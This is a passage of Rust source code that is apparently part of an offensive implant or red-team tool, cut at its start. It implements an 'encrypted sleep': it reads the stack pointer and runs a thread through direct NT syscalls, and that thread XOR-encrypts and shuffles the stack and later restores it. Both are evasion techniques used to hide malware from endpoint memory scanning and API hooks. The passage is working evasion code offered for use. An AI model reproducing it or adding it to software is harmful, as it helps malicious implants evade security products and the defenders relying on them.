    // 4. Decrypt the shuffled stack
    xor_encrypt(stack_region, stack_size, key);
    let _stack_after_decryption: Vec<u8> = unsafe { std::slice::from_raw_parts(stack_region, stack_size) }.to_vec();


    // 5. Restore the original order of the stack
    restore_stack(stack_region, stack_size, order);
    let _stack_after_restore: Vec<u8> = unsafe { std::slice::from_raw_parts(stack_region, stack_size) }.to_vec();


    0
}



fn encrypted_sleep(ms: u64) {
    println!("[+] Encrypting The Stack.... ");

    let _rsp = {
        let rsp: *const u8;
        unsafe {
            asm!("mov {}, rsp", out(reg) rsp);
            println!("[+] Retrieved rsp: {:p}", rsp);
        }
        NonNull::new(rsp as *mut u8).expect("Failed to get rsp")
    };

    let mut encrypt_thread_handle: HANDLE = std::ptr::null_mut();
    let status = unsafe {
        syscall!(
            "NtCreateThreadEx",
            &mut encrypt_thread_handle,
            0x001F03FF,
            std::ptr::null_mut::<c_void>(),
            -1isize as HANDLE,
            encrypt_thread as *mut fn(PVOID) -> DWORD,
            &ms as *const _ as PVOID,
            1,
            0,
            0,
            std::ptr::null_mut::<c_void>(),
            std::ptr::null_mut::<c_void>()
        )
    };

    if status < 0 {
        eprintln!("[-] Failed to create thread {:#X}", status);
        return;
    }
   

    unsafe { syscall!("NtResumeThread",encrypt_thread_handle, std::ptr::null_mut::<c_void>()) };
    
    // Wait for the thread to complete its execution
    unsafe {syscall!("NtWaitForSingleObject",encrypt_thread_handle, false as c_int, std::ptr::null_mut::<c_void>())};
    
    unsafe {syscall!("NtSuspendThread",encrypt_thread_handle, std::ptr::null_mut::<c_void>()) };
    
    
    unsafe{syscall!("NtClose",encrypt_thread_handle)};
}

